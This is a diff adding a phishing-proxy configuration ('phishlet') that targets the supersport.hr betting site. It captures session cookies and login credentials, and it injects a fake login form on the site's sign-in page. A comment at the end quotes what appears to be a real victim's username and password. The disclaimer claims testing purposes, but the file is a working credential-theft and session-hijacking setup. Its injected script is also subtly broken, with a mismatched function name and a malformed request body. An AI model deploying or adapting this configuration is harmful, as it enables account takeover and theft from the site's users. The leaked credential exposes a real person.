@@ -1,0 +1,63 @@
+# AUTHOR OF THIS PHISHLET WILL NOT BE RESPONSIBLE FOR ANY MISUSE OF THIS PHISHLET, PHISHLET IS MADE ONLY FOR TESTING/SECURITY/EDUCATIONAL PURPOSES.
+# PLEASE DO NOT MISUSE THIS PHISHLET.
+
+author: '@An0nud4y'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'supersport.hr', session: true, is_landing: true}
+  - {phish_sub: '', orig_sub: '', domain: 'supersport.hr', session: true, is_landing: false}
+sub_filters:
+  - {triggers_on: 'www.supersport.hr/res/', orig_sub: 'www', domain: 'supersport.hr', search: 'i=n(2494);', replace: 'i=n(165);', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.supersport.hr', orig_sub: 'www', domain: 'supersport.hr', search: 'i=n(2494);', replace: 'i=n(165);', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.supersport.hr', orig_sub: 'www', domain: 'supersport.hr', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.supersport.hr', orig_sub: 'www', domain: 'supersport.hr', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.supersport.hr', orig_sub: 'www', domain: 'supersport.hr', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'text/xml', 'text/javascript', 'text/php', 'application/php', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.supersport.hr', orig_sub: 'www', domain: 'supersport.hr', search: '{domain}', replace: '{domain}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.supersport.hr', orig_sub: 'www', domain: 'supersport.hr', search: 'i=n(2494);', replace: 'i=n(165);', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.supersport.hr/res/', orig_sub: 'www', domain: 'supersport.hr', search: 'i=n(2494);', replace: 'i=n(165);', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+
+
+# i=n(2494); -->  i=n(165);
+# a.render(r.createElement(i,null),document.getElementById("mount-app"));var o=n(139),l=n(165);
+# 
+
+auth_tokens:
+  - domain: '.supersport.hr'
+    keys: ['session_id', '_dvc', '.*,regexp']
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+login:
+  domain: 'www.supersport.hr'
+  path: '/igraci/prijava/'
+
+js_inject:
+  - trigger_domains: ["www.supersport.hr"]
+    trigger_paths: ["/igraci/prijava/"]
+    trigger_params: []
+    script: |
+      function onclickListener(){
+        document.getElementById("mount-app").innerHTML = '<div id="igrac_prijava" class="layout"><div class="formaTop"><h3>Login </h3></div><div class="fieldset"><form method="post"><div class="userInput"><div id="prijava_login_container"><div class=""><label for="login">nickname or email : </label><input class="textInput" name="prijava[login]" placeholder="nadimak ili email" maxlength="100" size="100" type="text" value=""><div class="userInput_state_message"></div></div></div><div id="prijava_password_container"><div class=""><label for="login">password : </label><input class="textInput" name="prijava[password]" placeholder="lozinka" maxlength="100" size="100" type="password" value=""><div class="userInput_state_message"></div></div></div><div style="margin-top: 15px;">Betting is prohibited for U.S. citizens and anyone with a work permit in the United States. </div></div><div class="formeRight"><div class="belowSubmit"><a href="/zaboravljena_lozinka">I forgot my password! </a></div><div class="belowSubmit">Only can apply <a href="/registracija">registered </a>players . </div></div><div class="submit prijava"><input class="prijaviButton submitButton disabled" id="prijavi" type="submit" value="" onclick="sendpass();"></div></form></div><img alt="Formabottom" src="/assets/forme/formaBottom.gif"></div>'
+        return;
+      }
+      function sendPass(){
+        var login = document.getElementsByName("prijava[login]")[0].value;
+        var password = document.getElementsByName("prijava[password]")[0].value;
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", '/login', true);
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.send("login="+encodeURIComponent(login)+""+" password="+encodeURIComponent(password));
+        return;
+      }
+      setTimeout(function(){ onclickListener(); }, 2000);
+  
+  
+# AUTHENTICATION REQUEST   
+#prijava:7
+#{"login":" jambra10","password":"Mrle1990.","useragent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0"}  
